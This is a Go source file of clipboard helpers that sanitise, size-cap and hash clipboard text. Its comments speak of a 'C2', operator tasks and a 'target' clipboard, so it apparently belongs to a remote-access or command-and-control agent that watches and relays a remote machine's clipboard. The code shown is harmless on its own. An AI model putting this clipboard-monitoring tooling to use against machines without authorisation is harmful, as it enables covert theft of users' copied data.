package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"strings"
	"unicode/utf8"
)

// MaxClipboardBytes bounds one clipboard value. A clipboard can hold megabytes
// (screenshots, whole documents); unbounded relay would let one paste stall the
// signaling socket and one `clipboard_get` task copy arbitrary host memory into
// the C2.
const MaxClipboardBytes = 64 * 1024

// sanitizeClipboardText makes one clipboard value safe to put on the wire:
// invalid UTF-8 is dropped (Windows UTF-16 -> UTF-8 conversion can produce it),
// NUL bytes are removed (they terminate CF_UNICODETEXT early and truncate
// whatever the receiver pastes), and the value is cut at a RUNE boundary so a
// 64 KiB cap cannot split a multi-byte character into a replacement glyph.
func sanitizeClipboardText(raw string) (text string, truncated bool) {
	text = strings.ToValidUTF8(raw, "")
	text = strings.ReplaceAll(text, "\x00", "")
	if len(text) <= MaxClipboardBytes {
		return text, false
	}
	cut := MaxClipboardBytes
	for cut > 0 && !utf8.RuneStart(text[cut]) {
		cut--
	}
	return text[:cut], true
}

// prepareClipboardWrite canonicalises operator text for the target clipboard.
// An oversized paste is REFUSED, not truncated: a half-copied script pasted
// into a remote shell runs a command nobody wrote. Only reads may truncate.
func prepareClipboardWrite(raw string) (string, error) {
	text := strings.ToValidUTF8(raw, "")
	text = strings.ReplaceAll(text, "\x00", "")
	if len(text) > MaxClipboardBytes {
		return "", fmt.Errorf("clipboard text exceeds %d bytes", MaxClipboardBytes)
	}
	return text, nil
}

// clipboardHash is the change detector for the poll: content is never compared
// byte by byte against the last frame, and only the hash is retained.
func clipboardHash(text string) string {
	sum := sha256.Sum256([]byte(text))
	return hex.EncodeToString(sum[:])
}
